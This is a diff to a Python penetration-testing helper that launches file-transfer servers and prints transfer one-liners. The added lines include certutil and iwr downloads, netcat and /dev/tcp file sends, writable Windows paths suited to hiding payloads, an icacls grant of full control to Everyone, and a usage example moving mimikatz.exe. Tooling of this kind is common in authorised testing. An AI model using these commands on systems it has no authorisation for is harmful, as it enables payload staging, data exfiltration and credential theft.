@@ -245,34 +245,178 @@ def start_smb_server():
 # Print instructions for file transfer with authentication
 def print_transfer_instructions():
     if SERVICE == 'ftp':
-        print(f"\n[+] FTP transfer instructions:")
-        print(f"   To download a file: curl ftp://{USERNAME}:{PASSWORD}@<IP>:{PORT}/{FILE} -o {FILE}")
-        print(f"   To upload a file: curl -T {FILE} ftp://{USERNAME}:{PASSWORD}@<IP>:{PORT}/{FILE}")
+        if USERNAME and PASSWORD:
+            print(f"   To download a file: curl ftp://{USERNAME}:{PASSWORD}@<IP>:{PORT}/{FILE} -o {FILE}")
+            print(f"   To upload a file: curl -T {FILE} ftp://{USERNAME}:{PASSWORD}@<IP>:{PORT}/{FILE}")
+        else:
+            print(f"   To download a file: curl ftp://<IP>:{PORT}/{FILE} -o {FILE}")
+            print(f"   To upload a file: curl -T {FILE} ftp://<IP>:{PORT}/{FILE}")
+
+
     elif SERVICE == 'sftp':
-        print(f"C:\Windows\System32\curl.exe --ftp-ssl -u {USERNAME}:{PASSWORD} -T {FILE} ftp://{IP}:{PORT}/{FILE}")
+        if USERNAME and PASSWORD:
+            print(f"C:\\Windows\\System32\\curl.exe --ftp-ssl -u {USERNAME}:{PASSWORD} -T {FILE} ftp://{IP}:{PORT}/{FILE}")
+        else:
+            print(f"C:\\Windows\\System32\\curl.exe --ftp-ssl -T {FILE} ftp://{IP}:{PORT}/{FILE}")
+
+    
     elif SERVICE == 'smb':
         print(Fore.GREEN + f"\n[+] SMB transfer instructions:\n" + Style.RESET_ALL)
         print(f"\tcopy {FILE} \\\\{IP}\share\{FILE}")
         print(f"\tcopy \\\\{IP}\share\{FILE} {FILE}")
         
-        print(Fore.YELLOW + f"\n\t[+]" + Style.RESET_ALL + "Create temporary units")
-        print(f"\tnet use x: \\\\{IP}\share /user:{USERNAME} {PASSWORD}")
-        print(f'\tNew-PSDrive -Name Z -PSProvider FileSystem -Root \\\\{IP}\share -Credential (New-Object PSCredential ("{USERNAME}", (ConvertTo-SecureString "{PASSWORD}" -AsPlainText -Force))) -Persist')
+        if USERNAME and PASSWORD:
+            print(Fore.YELLOW + f"\n\t[+]" + Style.RESET_ALL + "Create temporary units")
+            print(f"\tnet use x: \\\\{IP}\share /user:{USERNAME} {PASSWORD}")
+            print(f'\tNew-PSDrive -Name Z -PSProvider FileSystem -Root \\\\{IP}\share -Credential (New-Object PSCredential ("{USERNAME}", (ConvertTo-SecureString "{PASSWORD}" -AsPlainText -Force))) -Persist')
+        else:
+            print(Fore.YELLOW + f"\n\t[+]" + Style.RESET_ALL + "Create temporary units")
+            print(f"\tnet use x: \\\\{IP}\share")
+            print(f'\tNew-PSDrive -Name Z -PSProvider FileSystem -Root \\\\{IP}\share -Persist')
+
         print(Fore.YELLOW + f"\n\t[+]" + Style.RESET_ALL + "Copy to/from temporary units")
         print(f"\tcopy .\{FILE} x:\{FILE}")
         print(f"\tcopy x:\{FILE} .\{FILE}")
         print(Fore.YELLOW + f"\n\t[+]" + Style.RESET_ALL + "Delete units")
         print(f"\tnet use x: /delete")
         print(f"\tRemove-PSDrive -Name Z")
+
+
+
+    elif SERVICE == 'http':
+
+        print(f"Download")
+        if USERNAME and PASSWORD:
+            print(f"curl -u {USERNAME}:{PASSWORD} http://{IP}:{PORT}/{FILE} -o {FILE}")
+            print(f"certutil.exe -f -urlcache -split http://{USERNAME}:{PASSWORD}@{IP}:{PORT}/{FILE}")
+            print(f"iwr -uri http://{USERNAME}:{PASSWORD}@{IP}:{PORT}/{FILE} -OutFile {FILE}")
+            print(f"iwr -UseBasicParsing http://{USERNAME}:{PASSWORD}@{IP}:{PORT}/{FILE}")
+        else:
+            print(f"curl http://{IP}:{PORT}/{FILE} -o {FILE}")
+            print(f"certutil.exe -f -urlcache -split http://{IP}:{PORT}/{FILE}")
+            print(f"iwr -uri http://{IP}:{PORT}/{FILE} -OutFile {FILE}")
+            print(f"iwr -UseBasicParsing http://{IP}:{PORT}/{FILE}")
+
+        print("Upload")
+        if USERNAME and PASSWORD:
+            print(f"curl -u {USERNAME}:{PASSWORD} -X POST -F 'file=@{FILE}' http://{IP}:{PORT}/{FILE}")
+            print(f"iwr -uri http://{USERNAME}:{PASSWORD}@{IP}:{PORT}/{FILE} -Method Post -InFile {FILE} -UseBasicParsing")
+            print(f"curl -u {USERNAME}:{PASSWORD} -X POST -F \"file=@{FILE}\" http://{IP}:{PORT}/upload")
+        else:
+            print(f"curl -X POST -F 'file=@{FILE}' http://{IP}:{PORT}/{FILE}")
+            print(f"iwr -uri http://{IP}:{PORT}/{FILE} -Method Post -InFile {FILE} -UseBasicParsing")
+            print(f"curl -X POST -F \"file=@{FILE}\" http://{IP}:{PORT}/upload")
+        print(f"wget http://{IP}:{PORT}/{FILE} --method=POST --body-file={FILE} -OutFile response.txt")
+
+
+    elif SERVICE == 'https':
+
+        print(f"\n[+] HTTPS transfer instructions:")
+        print(f"To download a file: ")
+        if USERNAME and PASSWORD:
+            print(f"C:\\Windows\\System32\\curl.exe -u {USERNAME}:{PASSWORD} -o {FILE} https://{IP}:{PORT}/{FILE}")
+        else:
+            print(f"C:\\Windows\\System32\\curl.exe -o {FILE} https://{IP}:{PORT}/{FILE}")
+
+        print(f"\n[+] To upload a file:")
+        if USERNAME and PASSWORD:
+            print(f"C:\\Windows\\System32\\curl.exe -u {USERNAME}:{PASSWORD} -X POST -F 'file=@{FILE}' https://{IP}:{PORT}/{FILE}")
+        else:
+            print(f"C:\\Windows\\System32\\curl.exe -X POST -F 'file=@{FILE}' https://{IP}:{PORT}/{FILE}")
+
+
+    elif SERVICE == 'scp':
+
+        print(f"To copy a file over from local host to a remote host")
+        print(f"scp ./{FILE} {USERNAME}@{IP}:/tmp/{FILE} -p {PORT}")
+        print(f"To copy a file from a remote host to your local host")
+        print(f"scp {USERNAME}@{IP}:/tmp/{FILE} ./{FILE}")
+        print(f"To copy over a directory from your local host to a remote host")
+        print(f"scp -r directory {USERNAME}@{IP}:./{FILE}")
+
+    elif SERVICE == 'socat':
+        print(f"socat -u FILE:'{FILE}' TCP-LISTEN:{PORT},reuseaddr")
+        print(f"socat -u TCP:{IP}:{PORT} STDOUT > {FILE}")
+
+
+    elif SERVICE == 'nc':
+
+        print(f"\n********** Receive **********\n")
+        print(f"nc -nlvp {PORT} > {FILE}")
+
+        print(f"\n********** Send **********\n")
+        print(f"cat < {FILE} > /dev/tcp/{IP}/{PORT}")
+        print(f"nc -w 3 {IP} {PORT} < {FILE}")
+
+
+    elif SERVICE == 'servers':
+
+        print(f"php -S 0.0.0.0:{PORT}")
+        print("ruby -run -e httpd . -p {PORT}")
+
+        print(f"python -m SimpleHTTPServer {PORT}")
+        print(f"python2 -m SimpleHTTPServer {PORT}")
+        print(f"python3 -m http.server {PORT}")
+
+        print(f"python3 -m uploadserver {PORT}")
+        print(f"python3 -m uploadserver --basic-auth {USERNAME}:{PASSWORD}")
+        
+        print("\n********** Upload **********\n")
+        print(f"curl -X POST http://{IP}{PORT}/{FILE} -F 'files=@{FILE}'")
+
+        print("\n********** SMB share **********\n\n")
+        print(f"wsgidav --host=0.0.0.0 --port={PORT} --auth=anonymous --root /home/$SUDO_USER/")
+        print(f"impacket-smbserver share $(pwd) -smb2support")
+
+        sys.exit(0)
+
+    elif SERVICE == 'paths':
+
+        print("\n********** Windows **********\n")
+        print(f"C:\Windows\Tasks") 
+        print(f"C:\Windows\Temp")
+        print(f"C:\windows\\tracing")
+        print(f"C:\Windows\Registration\CRMLog")
+        print(f"C:\Windows\System32\FxsTmp")
+        print(f"C:\Windows\System32\com\dmp")
+        print(f"C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys")
+        print(f"C:\Windows\System32\spool\PRINTERS")
+        print(f"C:\Windows\System32\spool\SERVERS")
+        print(f"C:\Windows\System32\spool\drivers\color")
+        print(f"C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter")
+        print(f"C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)")
+        print(f"C:\Windows\SysWOW64\FxsTmp")
+        print(f"C:\Windows\SysWOW64\com\dmp")
+        print(f"C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter")
+        print(f"C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System")
+
+        
+        print("\n********** Linux **********\n")
+        print(f"find / -writable -type d 2>/dev/null")
+        print(f"/tmp")
+        print(f"/dev/shm")
+
+        print("\n********** Grant perm **********\n")
+        print(f"icacls C:\Windows\Temp /grant Everyone:(OI)(CI)F")
+        print(f"chmod +w .")
+
+        sys.exit(0)
+
+
     else:
-        print(f"\n[+] HTTP transfer instructions:")
-        print(f"   To download a file: curl http://{IP}:{PORT}/{FILE} -o {FILE}")
-        print(f"   To upload a file: curl -X POST -F 'file=@{FILE}' http://{IP}:{PORT}/{FILE}")
+        print(f"\n[+] Unrecognized protocol")
 
 
-
-
-
+def help():
+    print("Start https server with credentials")
+    print("servpy https -u kermit -pw Password123 -f mimikatz.exe")
+    print("-t: Print commands without starting any service")
+    print("servpy smb -u kermit -pw Password123 -f mimikatz.exe -t")
+    print("Start server one liners")
+    print("servpy servers")
+    print("Recomended paths for downloads")
+    print("servpy paths")
+    sys.exit(0)
 
 # Service selection function
 def run_service():
@@ -299,12 +443,14 @@ os.system("clear")
 
 # Argument parser setup
 parser = argparse.ArgumentParser(description="Simple multi-service server with optional authentication")
-parser.add_argument('service', choices=['http', 'ftp', 'smb', 'https', 'ftps'], help="Type of service to run (http, ftp, smb)")
+parser.add_argument('service', choices=['http', 'ftp', 'smb', 'https', 'ftps','socat','nc','scp','servers', 'paths'], help="Type of service to run (http, ftp, smb)")
 parser.add_argument('-p', '--port', type=int, default=80, help="Port number to use (default: 80)")
 parser.add_argument('-u', '--user', type=str, help="Username for authentication (optional)")
 parser.add_argument('-f', '--file', type=str, default="<file>", help="Path to a file to be used by the server")
 parser.add_argument('-i', '--interface', type=str, default="eth0", help="Interface IP")
 parser.add_argument('-pw', '--password', type=str, help="Password for authentication (optional)")
+parser.add_argument('-t', '--transfer', action='store_true', help="Transfer examples")
+
 args = parser.parse_args()
 
 
@@ -318,9 +464,18 @@ PASSWORD = args.password
 CERTFILE = 'server.crt'  # Ruta al certificado
 KEYFILE = 'server.key'   # Ruta a la clave privada
 
+        
+
 
 if __name__ == "__main__":
 
+    if args.transfer:
+        print_transfer_instructions()
+        sys.exit(0)
+
     print_transfer_instructions()
 
-    run_service()
+    if SERVICE in ['nc', 'socat', 'scp']:
+        sys.exit(0)
+    else:
+        run_service()
